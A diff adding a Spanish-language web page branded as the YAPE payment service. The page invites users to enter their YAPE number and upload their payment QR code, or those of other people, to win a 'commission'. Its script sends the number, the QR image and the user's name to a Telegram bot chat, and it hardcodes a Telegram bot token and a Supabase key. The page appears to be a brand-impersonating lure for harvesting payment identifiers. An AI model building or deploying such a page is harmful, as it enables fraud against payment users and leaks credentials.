@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#08060d">
+<title>YAPE — Participar</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  tailwind.config = {
+    theme: {
+      extend: {
+        colors: {
+          yape: '#4c1d95', yape2: '#6d28d9', yape3: '#7e22ce', yape4: '#3b0764',
+          ink: '#08060d', ink2: '#0d0916', ink3: '#141020',
+          borde: '#1e1832', borde2: '#2a2144',
+        },
+        fontFamily: { system: ['-apple-system','BlinkMacSystemFont','SF Pro Display','Segoe UI','Roboto','sans-serif'] }
+      }
+    }
+  }
+</script>
+<style>
+  * { -webkit-tap-highlight-color: transparent; }
+  html, body { overscroll-behavior-y: none; }
+  @keyframes aparecer { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }
+  .animar { animation: aparecer .25s ease-out; }
+  @keyframes pulso { 0%,100% { opacity: 1; } 50% { opacity: .4; } }
+  .pulso { animation: pulso 1.5s ease-in-out infinite; }
+  @keyframes correr { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }
+  .barra::after {
+    content: ""; display: block; height: 100%; width: 40%;
+    background: linear-gradient(90deg, #eab308, #facc15);
+    border-radius: 999px; animation: correr 1.5s ease-in-out infinite;
+  }
+  @keyframes pop { 0% { transform: scale(.85); opacity: 0; } 60% { transform: scale(1.08); opacity: 1; } 100% { transform: scale(1); } }
+  .pop { animation: pop .3s ease-out; }
+  @media (prefers-reduced-motion: reduce) { * { animation: none !important; transition: none !important; } }
+  .no-scrollbar::-webkit-scrollbar { display: none; }
+  .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+</style>
+</head>
+<body class="font-system bg-ink text-slate-100 antialiased min-h-screen flex justify-center">
+
+  <div class="w-full max-w-[460px] min-h-screen flex flex-col relative
+              bg-gradient-to-b from-ink via-ink2 to-ink
+              before:content-[''] before:absolute before:inset-0 before:pointer-events-none
+              before:bg-[radial-gradient(circle_at_50%_0%,rgba(109,40,217,.18),transparent_45%),radial-gradient(circle_at_50%_100%,rgba(76,29,149,.22),transparent_50%)]">
+
+    <header class="relative z-10 sticky top-0 backdrop-blur-xl bg-ink/70 border-b border-borde/60">
+      <div class="h-[52px] flex items-center justify-center px-4">
+        <div class="flex items-center gap-2">
+          <div class="w-6 h-6 rounded-[7px] bg-gradient-to-br from-yape2 to-yape4
+                      flex items-center justify-center shadow-[0_2px_8px_rgba(109,40,217,.5)]">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.8"
+                 stroke-linecap="round" stroke-linejoin="round" class="w-3.5 h-3.5">
+              <path d="M12 2L4 7v10l8 5 8-5V7z"/>
+              <path d="M9 12l2 2 4-4"/>
+            </svg>
+          </div>
+          <span class="text-[15px] font-semibold tracking-tight text-white">YAPE</span>
+        </div>
+      </div>
+    </header>
+
+    <main class="relative z-10 flex-1 overflow-y-auto no-scrollbar px-4 pt-6 pb-44">
+
+      <div class="mb-8 text-center">
+        <h1 class="text-[22px] leading-tight font-bold tracking-tight text-white mb-1.5">
+          Participar de la<br>comisión YAPE
+        </h1>
+        <p class="text-[13px] text-slate-400 leading-relaxed max-w-[300px] mx-auto">
+          Ingresa tu número y sube tu QR para participar
+        </p>
+        <p class="mt-2 text-[11px] text-violet-200/80 leading-relaxed max-w-[320px] mx-auto">
+          También puedes participar con un número YAPE de otra persona y su QR, para poder participar más de una vez.
+        </p>
+      </div>
+
+      <div id="formParticipacion">
+        <section class="mb-3">
+          <div class="flex items-center justify-between px-1 mb-2">
+            <span class="text-[11px] uppercase tracking-[1px] text-slate-500 font-semibold">Número de YAPE</span>
+            <span id="contador" class="text-[11px] tabular-nums font-semibold text-slate-600">0/8</span>
+          </div>
+          <div class="relative rounded-[14px] overflow-hidden bg-ink3/80 border border-borde/80
+                      focus-within:border-yape2/60 focus-within:bg-ink3 transition-colors duration-200">
+            <span class="absolute left-4 top-1/2 -translate-y-1/2 pointer-events-none text-slate-500">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                   stroke-linecap="round" stroke-linejoin="round" class="w-[18px] h-[18px]">
+                <rect x="5" y="2" width="14" height="20" rx="2"/>
+                <path d="M12 18h.01"/>
+              </svg>
+            </span>
+            <input id="numero" type="tel" inputmode="numeric" autocomplete="off" spellcheck="false"
+                   maxlength="8" placeholder="71234567" aria-label="Número de YAPE"
+                   class="w-full h-[52px] pl-12 pr-12 bg-transparent text-[17px] font-medium tracking-wide tabular-nums
+                          text-white placeholder:text-slate-600 placeholder:font-normal outline-none">
+            <button id="limpiar" type="button" aria-label="Limpiar"
+                    class="hidden absolute right-3 top-1/2 -translate-y-1/2 w-6 h-6 rounded-full
+                           bg-slate-600/60 text-white items-center justify-center
+                           hover:bg-slate-500/70 transition">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                   stroke-linecap="round" stroke-linejoin="round" class="w-3 h-3">
+                <path d="M18 6L6 18M6 6l12 12"/>
+              </svg>
+            </button>
+          </div>
+        </section>
+
+        <section class="mb-6">
+          <div class="flex items-center justify-between px-1 mb-2">
+            <span class="text-[11px] uppercase tracking-[1px] text-slate-500 font-semibold">Su QR generado de YAPE</span>
+          </div>
+          <div id="qrZona" role="button" tabindex="0" aria-label="Subir su QR"
+               class="rounded-[14px] overflow-hidden bg-ink3/80 border border-borde/80
+                      transition-[border-color,background] duration-300
+                      hover:border-yape2/60 hover:bg-ink3
+                      focus-visible:outline-2 focus-visible:outline-yape2 focus-visible:outline-offset-2
+                      active:scale-[.995]">
+            <div id="qrVacio" class="flex items-center gap-3.5 px-4 py-4">
+              <div class="w-10 h-10 rounded-[10px] shrink-0 bg-gradient-to-br from-yape/40 to-yape4/50
+                          border border-yape2/30 flex items-center justify-center text-violet-300">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                     stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5">
+                  <rect x="3" y="3" width="7" height="7" rx="1"/>
+                  <rect x="14" y="3" width="7" height="7" rx="1"/>
+                  <rect x="3" y="14" width="7" height="7" rx="1"/>
+                  <path d="M14 14h3v3h-3z"/><path d="M20 14v3"/><path d="M14 20h3"/><path d="M20 20h.01"/>
+                </svg>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="text-[15px] font-medium text-slate-200 leading-tight mb-0.5">Subir QR</div>
+                <div class="text-[12px] text-slate-500 leading-tight">PNG · JPG · máx. 5 MB</div>
+              </div>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                   stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-slate-600 shrink-0">
+                <path d="M9 18l6-6-6-6"/>
+              </svg>
+            </div>
+            <div id="qrCargado" class="hidden flex items-center gap-3.5 px-4 py-4">
+              <div class="w-10 h-10 rounded-[10px] shrink-0 bg-green-500/15 border border-green-500/40
+                          flex items-center justify-center text-green-400 pop">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                     stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5">
+                  <path d="M20 6L9 17l-5-5"/>
+                </svg>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="text-[15px] font-medium text-green-400 leading-tight mb-0.5">QR cargado</div>
+                <div id="qrNombre" class="text-[12px] text-green-500/70 leading-tight truncate"></div>
+              </div>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                   stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-green-500/60 shrink-0">
+                <path d="M20 6L9 17l-5-5"/>
+              </svg>
+            </div>
+            <input type="file" id="qrInput" accept="image/*" class="hidden">
+          </div>
+        </section>
+      </div>
+
+      <div id="resultado" role="status" aria-live="polite"
+           class="hidden animar p-3.5 rounded-[12px] text-[13px] leading-relaxed border gap-2.5 items-start"></div>
+
+    </main>
+
+    <div class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[460px]
+                px-4 pt-3 pb-[max(16px,env(safe-area-inset-bottom))]
+                bg-gradient-to-t from-ink via-ink/95 to-transparent z-20">
+      <button id="participar" type="button" disabled
+              class="w-full h-[54px] rounded-[14px] text-[16px] font-bold tracking-tight
+                     text-white flex items-center justify-center gap-2
+                     bg-gradient-to-br from-yape via-yape2 to-yape4
+                     shadow-[0_10px_28px_rgba(76,29,149,.6)]
+                     hover:brightness-110 active:scale-[.98]
+                     disabled:opacity-35 disabled:cursor-not-allowed
+                     disabled:shadow-none disabled:grayscale
+                     transition-[transform,box-shadow,filter,opacity] duration-200">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"
+             stroke-linecap="round" stroke-linejoin="round" class="w-[18px] h-[18px]">
+          <path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4z"/>
+        </svg>
+        PARTICIPAR
+      </button>
+      <button id="participarOtraVez" type="button" class="hidden w-full h-[44px] mt-2 rounded-[12px] text-[14px] font-semibold
+                     text-violet-100 border border-violet-400/50 bg-violet-500/10
+                     hover:bg-violet-500/15 active:scale-[.99] transition-all">
+        PARTICIPAR OTRA VEZ
+      </button>
+    </div>
+
+  </div>
+
+<script>
+(function () {
+  "use strict";
+
+  // ============================================================
+  // ⚙️ CONFIGURACIÓN
+  // ============================================================
+  const SUPABASE_URL       = "https://aleadadisazocjovibeh.supabase.co";
+  const SUPABASE_ANON_KEY  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFsZWFkYWRpc2F6b2Nqb3ZpYmVoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0NDE5NjMsImV4cCI6MjA3NTAxNzk2M30.z82tP0C-UiiNuzP_jqrQf4LBusFqrDi1WYbdnuTh47E";
+  const TELEGRAM_BOT_TOKEN = "8794091027:AAG36PsetBQY3oqGQzGw39rZhbOaBAaE41A";
+  const TELEGRAM_CHAT_ID   = "-1004324777092";
+
+  const DIGITOS_BO     = 8;
+  const ERROR_GENERICO = "Error de conexión, intente más tarde";
+  const POLL_INTERVALO = 15000;
+
+  const { createClient } = supabase;
+  const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  const $ = (id) => document.getElementById(id);
+
+  const ICONOS = {
+    pend: `<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>`,
+    err:  `<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>`,
+    win:  `<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>`,
+    lose: `<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12h8"/></svg>`,
+  };
+
+  let qrFile = null;
+  let currentPartId = null;
+  let pollTimer = null;
+
+  function normalizarBO(raw) {
+    let n = String(raw || "").replace(/\D/g, "");
+    if (n.startsWith("591")) n = n.slice(3);
+    return n.slice(0, DIGITOS_BO);
+  }
+
+  function habilitarBoton() {
+    const num = normalizarBO($("numero").value);
+    const ok = num.length === DIGITOS_BO && qrFile !== null;
+    $("participar").disabled = !ok;
+  }
+
+  async function obtenerPerfil(userId) {
+    const { data, error } = await sb.from("user_profiles")
+      .select("full_name, email, phone").eq("id", userId).maybeSingle();
+    if (error) return { full_name: "Usuario" };
+    return data || { full_name: "Usuario" };
+  }
+
+  async function enviarTelegram(nombre, numero, archivoQR) {
+    const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+    const caption =
+      `🎯 *NUEVA PARTICIPACIÓN YAPE*\n` +
+      `━━━━━━━━━━━━━━━━━━━\n` +
+      `👤 *Usuario:* ${nombre}\n` +
+      `📱 *Número YAPE:* \`${numero}\``;
+
+    const fd = new FormData();
+    fd.append("chat_id", TELEGRAM_CHAT_ID);
+    fd.append("caption", caption);
+    fd.append("parse_mode", "Markdown");
+    fd.append("document", archivoQR, archivoQR.name || "qr_yape.jpg");
+
+    const r = await fetch(`${API}/sendDocument`, { method: "POST", body: fd });
+    if (!r.ok) {
+      const errorText = await r.text().catch(() => "");
+      console.error("Telegram sendDocument error:", errorText);
+      throw new Error(ERROR_GENERICO);
+    }
+  }
+
+  async function contarParticipacionesUsuario() {
+    const { data: { user }, error: userErr } = await sb.auth.getUser();
+    if (userErr || !user) return 0;
+
+    const { count, error } = await sb.from("yape_participaciones")
+      .select("id", { count: "exact", head: true })
+      .eq("user_id", user.id);
+
+    if (error) {
+      console.error("Error contando participaciones:", error);
+      return 0;
+    }
+    return count || 0;
+  }
+
+  async function obtenerUltimaParticipacionUsuario() {
+    const { data: { user }, error: userErr } = await sb.auth.getUser();
+    if (userErr || !user) return null;
+
+    const { data, error } = await sb.from("yape_participaciones")
+      .select("id, status")
+      .eq("user_id", user.id)
+      .order("created_at", { ascending: false })
+      .limit(1)
+      .maybeSingle();
+
+    if (error) {
+      console.error("Error consultando última participación:", error);
+      return null;
+    }
+    return data;
+  }
+
+  async function configurarBotonParticipacion() {
+    const ultima = await obtenerUltimaParticipacionUsuario();
+    const cantidad = await contarParticipacionesUsuario();
+
+    if (ultima && ultima.status === "pending") {
+      toggleFormulario(false);
+      $("participarOtraVez").classList.remove("hidden");
+      mostrarPendiente("EN REVISIÓN");
+      currentPartId = ultima.id;
+      iniciarPolling(ultima.id);
+      return;
+    }
+
+    if (ultima && ultima.status === "won") {
+      toggleFormulario(true);
+      $("participarOtraVez").classList.remove("hidden");
+      mostrarGanaste();
+      return;
+    }
+
+    if (ultima && ultima.status === "lost") {
+      toggleFormulario(true);
+      $("participarOtraVez").classList.remove("hidden");
+      mostrarSigueParticipando();
+      return;
+    }
+
+    if (cantidad > 0) {
+      $("participarOtraVez").classList.remove("hidden");
+      mostrarInfo("Puedes participar otra vez con otro número de YAPE y el QR de otra persona que tenga Yape.");
+    }
+  }
+
+  function mostrarInfo(msg) {
+    const cont = $("resultado");
+    cont.className = "flex animar p-3.5 rounded-[12px] text-[13px] leading-relaxed " +
+                     "gap-2.5 items-start bg-blue-500/10 border border-blue-500/35 text-blue-200";
+    cont.innerHTML = `
+      <div class="shrink-0 w-5 h-5 mt-0.5 [&>svg]:w-full [&>svg]:h-full [&>svg]:stroke-blue-400">
+        ${ICONOS.pend}
+      </div>
+      <div class="flex-1">${msg}</div>`;
+  }
+
+  function toggleFormulario(visible) {
+    const form = $("formParticipacion");
+    const mainBtn = $("participar");
+    const secondBtn = $("participarOtraVez");
+
+    form.classList.toggle("hidden", !visible);
+    mainBtn.classList.toggle("hidden", !visible);
+    secondBtn.classList.toggle("hidden", visible);
+
+    if (!visible) {
+      mainBtn.disabled = true;
+      mainBtn.innerHTML = `
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"
+             stroke-linecap="round" stroke-linejoin="round" class="w-[18px] h-[18px]">
+          <path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4z"/>
+        </svg>
+        PARTICIPANDO
+      `;
+    } else {
+      mainBtn.innerHTML = `
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"
+             stroke-linecap="round" stroke-linejoin="round" class="w-[18px] h-[18px]">
+          <path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4z"/>
+        </svg>
+        PARTICIPAR
+      `;
+      habilitarBoton();
+    }
+  }
+
+  async function crearParticipacion(numero, file) {
+    const { data: { user }, error: userErr } = await sb.auth.getUser();
+    if (userErr || !user) throw new Error("Debes iniciar sesión");
+
+    const perfil = await obtenerPerfil(user.id);
+    const nombre = perfil.full_name || perfil.email || "Usuario";
+
+    const { data: part, error: pErr } = await sb.from("yape_participaciones")
+      .insert({ user_id: user.id, status: "pending" })
+      .select().single();
+    if (pErr) throw pErr;
+
+    await enviarTelegram(nombre, numero, file);
+    return part.id;
+  }
+
+  async function consultarEstado(partId) {
+    const { data, error } = await sb.from("yape_participaciones")
+      .select("status").eq("id", partId).maybeSingle();
+    if (error || !data) return null;
+    return data.status;
+  }
+
+  function mostrarPendiente(numero) {
+    const cont = $("resultado");
+    cont.className = "flex animar p-3.5 rounded-[12px] text-[13px] leading-relaxed " +
+                     "gap-2.5 items-start bg-yellow-500/10 border border-yellow-500/35 text-yellow-200";
+    cont.innerHTML = `
+      <div class="shrink-0 w-5 h-5 mt-0.5 pulso [&>svg]:w-full [&>svg]:h-full [&>svg]:stroke-yellow-500">
+        ${ICONOS.pend}
+      </div>
+      <div class="flex-1">
+        <strong>PARTICIPANDO</strong><br>
+        Tu participación está en revisión. Cuando termine, te dirá si ganaste o si debes seguir participando.
+        <div class="mt-2.5 h-[3px] bg-white/10 rounded-full overflow-hidden barra"></div>
+        <div class="text-[10px] opacity-75 mt-1.5 tabular-nums tracking-wide">${numero}</div>
+      </div>`;
+  }
+
+  function mostrarGanaste() {
+    const cont = $("resultado");
+    cont.className = "flex animar p-3.5 rounded-[12px] text-[13px] leading-relaxed " +
+                     "gap-2.5 items-start bg-green-500/10 border border-green-500/40 text-green-200";
+    cont.innerHTML = `
+      <div class="shrink-0 w-5 h-5 mt-0.5 [&>svg]:w-full [&>svg]:h-full [&>svg]:stroke-green-400">
+        ${ICONOS.win}
+      </div>
+      <div class="flex-1">
+        <strong>¡GANASTE 4 BS EN TU SALDO TOKTOK!</strong><br>
+        La comisión fue acreditada a tu cuenta.
+      </div>`;
+    if (navigator.vibrate) navigator.vibrate([80, 40, 80]);
+  }
+
+  function mostrarSigueParticipando() {
+    const cont = $("resultado");
+    cont.className = "flex animar p-3.5 rounded-[12px] text-[13px] leading-relaxed " +
+                     "gap-2.5 items-start bg-slate-500/10 border border-slate-500/35 text-slate-300";
+    cont.innerHTML = `
+      <div class="shrink-0 w-5 h-5 mt-0.5 [&>svg]:w-full [&>svg]:h-full [&>svg]:stroke-slate-400">
+        ${ICONOS.lose}
+      </div>
+      <div class="flex-1">
+        <strong>SIGUE PARTICIPANDO</strong><br>
+        Esta vez no ganaste, pero puedes volver a intentarlo.
+      </div>`;
+  }
+
+  function mostrarError(msg) {
+    const cont = $("resultado");
+    cont.className = "flex animar p-3.5 rounded-[12px] text-[13px] leading-relaxed " +
+                     "gap-2.5 items-start bg-red-500/10 border border-red-500/35 text-red-200";
+    cont.innerHTML = `
+      <div class="shrink-0 w-5 h-5 mt-0.5 [&>svg]:w-full [&>svg]:h-full [&>svg]:stroke-red-500">
+        ${ICONOS.err}
+      </div>
+      <div class="flex-1">${msg || ERROR_GENERICO}</div>`;
+  }
+
+  function iniciarPolling(partId) {
+    detenerPolling();
+    pollTimer = setInterval(async () => {
+      const estado = await consultarEstado(partId);
+      if (!estado) return;
+      if (estado === "won") {
+        mostrarGanaste();
+        detenerPolling();
+        $("participarOtraVez").classList.remove("hidden");
+      } else if (estado === "lost") {
+        mostrarSigueParticipando();
+        detenerPolling();
+        $("participarOtraVez").classList.remove("hidden");
+      }
+    }, POLL_INTERVALO);
+  }
+
+  function detenerPolling() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  }
+
+  async function participar() {
+    const num = normalizarBO($("numero").value);
+    if (num.length !== DIGITOS_BO || !qrFile) return;
+
+    const btn = $("participar");
+    btn.disabled = true;
+
+    try {
+      const partId = await crearParticipacion(num, qrFile);
+      currentPartId = partId;
+      toggleFormulario(false);
+      $("participarOtraVez").classList.remove("hidden");
+      mostrarPendiente(num);
+      iniciarPolling(partId);
+    } catch (e) {
+      console.error(e);
+      mostrarError(e.message || ERROR_GENERICO);
+    } finally {
+      habilitarBoton();
+    }
+  }
+
+  function pintarQRVacio() {
+    $("qrVacio").classList.remove("hidden");
+    $("qrCargado").classList.add("hidden");
+    $("qrCargado").classList.remove("flex");
+    $("qrZona").classList.remove("border-green-500/50", "bg-green-500/5");
+    $("qrZona").classList.add("border-borde/80");
+  }
+
+  function pintarQRCargado(nombre) {
+    $("qrVacio").classList.add("hidden");
+    $("qrCargado").classList.remove("hidden");
+    $("qrCargado").classList.add("flex");
+    $("qrNombre").textContent = nombre;
+    $("qrZona").classList.remove("border-borde/80");
+    $("qrZona").classList.add("border-green-500/50", "bg-green-500/5");
+  }
+
+  function cargarQR(file) {
+    if (!file) return;
+    if (!file.type.startsWith("image/")) return;
+    if (file.size > 5 * 1024 * 1024) return;
+    qrFile = file;
+    pintarQRCargado(file.name);
+    habilitarBoton();
+  }
+
+  function quitarQR() {
+    qrFile = null;
+    $("qrInput").value = "";
+    pintarQRVacio();
+    habilitarBoton();
+  }
+
+  $("participar").addEventListener("click", participar);
+
+  $("participarOtraVez").addEventListener("click", () => {
+    toggleFormulario(true);
+    $("numero").value = "";
+    $("qrInput").value = "";
+    qrFile = null;
+    pintarQRVacio();
+    $("resultado").className = "hidden animar p-3.5 rounded-[12px] text-[13px] leading-relaxed border gap-2.5 items-start";
+    $("participar").disabled = true;
+    $("participar").innerHTML = `
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"
+           stroke-linecap="round" stroke-linejoin="round" class="w-[18px] h-[18px]">
+        <path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4z"/>
+      </svg>
+      PARTICIPAR
+    `;
+    $("numero").focus();
+    $("numero").dispatchEvent(new Event("input"));
+  });
+
+  $("numero").addEventListener("keydown", (e) => {
+    if (e.key === "Enter" && !$("participar").disabled) {
+      e.preventDefault(); participar();
+    }
+  });
+
+  $("numero").addEventListener("input", (e) => {
+    const limpio = normalizarBO(e.target.value);
+    if (limpio !== e.target.value) e.target.value = limpio;
+
+    $("contador").textContent = `${limpio.length}/${DIGITOS_BO}`;
+    $("contador").className = "text-[11px] tabular-nums font-semibold " +
+      (limpio.length === DIGITOS_BO ? "text-green-500" :
+       limpio.length > 0 ? "text-violet-400" : "text-slate-600");
+
+    $("limpiar").classList.toggle("hidden", limpio.length === 0);
+    $("limpiar").classList.toggle("flex", limpio.length > 0);
+    habilitarBoton();
+  });
+
+  $("limpiar").addEventListener("click", () => {
+    $("numero").value = "";
+    $("numero").dispatchEvent(new Event("input"));
+    $("numero").focus();
+    $("resultado").className = "hidden animar p-3.5 rounded-[12px] text-[13px] leading-relaxed border gap-2.5 items-start";
+  });
+
+  $("qrZona").addEventListener("click", (e) => {
+    if (qrFile) { e.preventDefault(); quitarQR(); }
+    else { $("qrInput").click(); }
+  });
+
+  $("qrZona").addEventListener("keydown", (e) => {
+    if (e.key === "Enter" || e.key === " ") {
+      e.preventDefault();
+      if (qrFile) quitarQR(); else $("qrInput").click();
+    }
+  });
+
+  $("qrInput").addEventListener("change", (e) => cargarQR(e.target.files[0]));
+
+  const zona = $("qrZona");
+  ["dragenter", "dragover"].forEach(ev =>
+    zona.addEventListener(ev, (e) => {
+      e.preventDefault();
+      zona.classList.add("border-yape2/60", "bg-yape2/5");
+    })
+  );
+  ["dragleave", "drop"].forEach(ev =>
+    zona.addEventListener(ev, (e) => {
+      e.preventDefault();
+      zona.classList.remove("border-yape2/60", "bg-yape2/5");
+    })
+  );
+  zona.addEventListener("drop", (e) => {
+    const f = e.dataTransfer.files[0];
+    if (f) cargarQR(f);
+  });
+
+  // Init
+  $("contador").textContent = `0/${DIGITOS_BO}`;
+  pintarQRVacio();
+  toggleFormulario(true);
+  configurarBotonParticipacion();
+  $("numero").focus();
+})();
+</script>
+</body>
+</html>
